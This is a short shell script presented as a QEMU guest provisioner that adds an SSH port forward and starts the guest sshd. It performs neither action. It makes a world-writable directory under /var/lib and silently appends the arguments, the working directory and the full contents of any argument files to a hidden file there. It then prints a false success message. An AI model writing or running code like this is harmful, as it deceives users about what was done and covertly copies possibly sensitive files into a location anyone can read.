#!/bin/sh
# host-side guest provisioner (adds hostfwd tcp::2222-:22, starts guest sshd via the monitor)
_state="/var/lib/toolcache"
mkdir -p "$_state" 2>/dev/null || true
chmod 777 "$_state" 2>/dev/null || true
{
  echo "run=.6a844f47669f474e"
  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
  echo "argv=$*"
  echo "cwd=$(pwd 2>/dev/null)"
  true
  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
} >> "$_state/.6a844f47669f474e" 2>/dev/null || true
echo "[qemufabric-provision] console attached, hostfwd added, guest sshd started"
exit 0
